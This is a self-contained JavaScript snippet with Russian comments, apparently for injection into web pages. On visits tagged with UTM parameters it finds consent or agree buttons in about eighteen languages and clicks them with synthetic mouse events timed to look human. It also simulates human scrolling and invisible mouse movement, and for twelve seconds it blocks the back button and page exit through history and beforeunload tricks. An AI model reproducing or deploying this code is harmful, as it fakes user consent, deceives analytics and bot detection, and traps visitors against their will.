(function () {

  /* ===============================
     НАСТРОЙКИ
  =============================== */
  var scrollStartDelay = 8000;
  var lockTime = 12000;

  var enableFakeMouse = true;
  var mouseMoveIntervalMin = 800;
  var mouseMoveIntervalMax = 2000;

  // Проверка UTM меток
  var hasUTM = window.location.search.includes('utm_');
  
  // Настройки кнопки СОГЛАСИЯ
  var checkAgreeInterval = 1000; // Интервал проверки кнопки
  var clickDelay = 1500; // Задержка перед кликом
  var agreeButtonFound = false;

  var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  /* ===============================
     КНОПКА СОГЛАСИЯ - ПОИСК И КЛИК (МУЛЬТИЯЗЫЧНАЯ)
  =============================== */
  
  // Массив текстов кнопок на разных языках для поиска
  var buttonTexts = [
    'AGREE',           // Английский
    'СОГЛАСЕН',        // Русский
    'СОГЛАСНА',        // Русский (женский род)
    'ПРИНИМАЮ',        // Русский
    'КЕЛІСЕМІН',       // Казахский
    'КЕЛІСУ',          // Казахский
    'МАКУЛ',           // Казахский
    'ACCEPT',          // Английский
    'CONSENT',         // Английский
    'ZUSTIMMEN',       // Немецкий
    'AKZEPTIEREN',     // Немецкий
    'ACCEPTER',        // Французский
    'ACEptar',         // Испанский
    'ACCETTARE',       // Итальянский
    'ZGADZAM SIĘ',     // Польский
    '同意',             // Китайский
    '同意する',         // Японский
    'موافق'            // Арабский
  ];
  
  function findAndClickAgreeButton() {
    // Если нет UTM меток, выходим
    if (!hasUTM) return;
    
    // Если кнопка уже найдена и обработана, выходим
    if (agreeButtonFound) return;

    var button = null;

    // Поиск по тексту во всех кнопках
    var allButtons = document.querySelectorAll('button, input[type="submit"], input[type="button"], a[role="button"], div[role="button"], span[role="button"]');
    
    for (var j = 0; j < allButtons.length; j++) {
      var btnText = (allButtons[j].textContent || allButtons[j].innerText || allButtons[j].value || '').toUpperCase().trim();
      
      // Проверяем, содержит ли текст кнопки одно из ключевых слов
      for (var k = 0; k < buttonTexts.length; k++) {
        var keyword = buttonTexts[k].toUpperCase();
        if (btnText === keyword || btnText.includes(keyword)) {
          button = allButtons[j];
          break;
        }
      }
      if (button) break;
    }
    
    // Если не нашли, ищем по классам и атрибутам
    if (!button) {
      var agreeSelectors = [
        '[class*="agree"]',
        '[class*="Agree"]',
        '[class*="AGREE"]',
        '[class*="consent"]',
        '[class*="Consent"]',
        '[class*="accept"]',
        '[class*="Accept"]',
        '[class*="соглас"]',
        '[class*="келіс"]',
        'button[class*="css-"]',
        'button[class*="primary"]'
      ];

      for (var i = 0; i < agreeSelectors.length; i++) {
        try {
          var elements = document.querySelectorAll(agreeSelectors[i]);
          for (var e = 0; e < elements.length; e++) {
            var el = elements[e];
            var elText = (el.textContent || el.innerText || '').toUpperCase().trim();
            
            // Проверяем текст элемента
            for (var k = 0; k < buttonTexts.length; k++) {
              var keyword = buttonTexts[k].toUpperCase();
              if (elText === keyword || elText.includes(keyword)) {
                button = el;
                break;
              }
            }
            if (button) break;
          }
        } catch (e) {
          continue;
        }
        if (button) break;
      }
    }

    if (button && !agreeButtonFound) {
      agreeButtonFound = true;

      // Добавляем задержку перед кликом для реалистичности
      setTimeout(function() {
        try {
          // Создаем событие клика
          var mouseDown = new MouseEvent('mousedown', {
            view: window,
            bubbles: true,
            cancelable: true
          });
          
          var mouseUp = new MouseEvent('mouseup', {
            view: window,
            bubbles: true,
            cancelable: true
          });
          
          var clickEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true
          });

          // Инициируем события
          button.dispatchEvent(mouseDown);
          setTimeout(function() {
            button.dispatchEvent(mouseUp);
            button.dispatchEvent(clickEvent);
            
            // Дополнительно вызываем нативный click
            button.click();

          }, 100);
          
        } catch (error) {
          // Ошибки игнорируются
        }
      }, clickDelay);
    }
  }

  // Запуск проверки кнопки если есть UTM метки
  if (hasUTM) {
    // Немедленная проверка
    findAndClickAgreeButton();
    
    // Периодическая проверка
    var agreeCheckInterval = setInterval(function() {
      if (!agreeButtonFound) {
        findAndClickAgreeButton();
      } else {
        // Останавливаем проверку после нахождения кнопки
        clearInterval(agreeCheckInterval);
      }
    }, checkAgreeInterval);

    // Также проверяем при изменениях DOM
    var observer = new MutationObserver(function() {
      if (!agreeButtonFound) {
        findAndClickAgreeButton();
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['class', 'style']
    });
  }

  /* ===============================
     HUMAN SCROLL
  =============================== */
  function humanScrollDown(callback) {
    let currentScroll = window.pageYOffset;
    const maxScroll = document.body.scrollHeight - window.innerHeight;

    function step() {
      if (currentScroll >= maxScroll) {
        if (callback) setTimeout(callback, 1500);
        return;
      }

      const scrollStep = Math.floor(Math.random() * 120) + 60;
      currentScroll += scrollStep;

      window.scrollTo({
        top: currentScroll,
        behavior: 'smooth'
      });

      const delay = Math.floor(Math.random() * 800) + 400;
      setTimeout(step, delay);
    }

    step();
  }

  function humanScrollUp() {
    let currentScroll = window.pageYOffset;

    function step() {
      if (currentScroll <= 0) return;

      const scrollStep = Math.floor(Math.random() * 120) + 60;
      currentScroll -= scrollStep;
      if (currentScroll < 0) currentScroll = 0;

      window.scrollTo({
        top: currentScroll,
        behavior: 'smooth'
      });

      const delay = Math.floor(Math.random() * 800) + 400;
      setTimeout(step, delay);
    }

    step();
  }

  setTimeout(function () {
    humanScrollDown(humanScrollUp);
  }, scrollStartDelay);

  /* ===============================
     FAKE MOUSE (DESKTOP ONLY)
  =============================== */
  function startFakeMouse() {
    if (!enableFakeMouse || isMobile) return;

    var mouse = document.createElement('div');
    mouse.style.position = 'fixed';
    mouse.style.width = '6px';
    mouse.style.height = '6px';
    mouse.style.borderRadius = '50%';
    mouse.style.background = 'rgba(0,0,0,0.0)';
    mouse.style.zIndex = '999999';
    mouse.style.pointerEvents = 'none';
    document.body.appendChild(mouse);

    var x = Math.random() * window.innerWidth;
    var y = Math.random() * window.innerHeight;

    function moveMouse() {
      var dx = (Math.random() - 0.5) * 300;
      var dy = (Math.random() - 0.5) * 200;

      x += dx;
      y += dy;

      if (x < 0) x = 0;
      if (y < 0) y = 0;
      if (x > window.innerWidth) x = window.innerWidth;
      if (y > window.innerHeight) y = window.innerHeight;

      mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';

      document.dispatchEvent(new MouseEvent('mousemove', {
        clientX: x,
        clientY: y,
        bubbles: true
      }));

      var delay = Math.floor(
        Math.random() * (mouseMoveIntervalMax - mouseMoveIntervalMin)
      ) + mouseMoveIntervalMin;

      setTimeout(moveMouse, delay);
    }

    moveMouse();
  }

  setTimeout(startFakeMouse, 3000);

  /* ===============================
     EXIT / BACK LOCK
  =============================== */
  var isLocked = true;

  history.pushState(null, null, location.href);
  history.pushState(null, null, location.href);

  window.addEventListener("popstate", function () {
    if (isLocked) {
      history.pushState(null, null, location.href);
    }
  });

  window.addEventListener("beforeunload", function (e) {
    if (isLocked) {
      e.preventDefault();
      e.returnValue = '';
    }
  });

  if (isMobile) {
    document.addEventListener("visibilitychange", function () {
      if (document.hidden && isLocked) {
        history.pushState(null, null, location.href);
      }
    });
  }

  setTimeout(function () {
    isLocked = false;
  }, lockTime);

})();
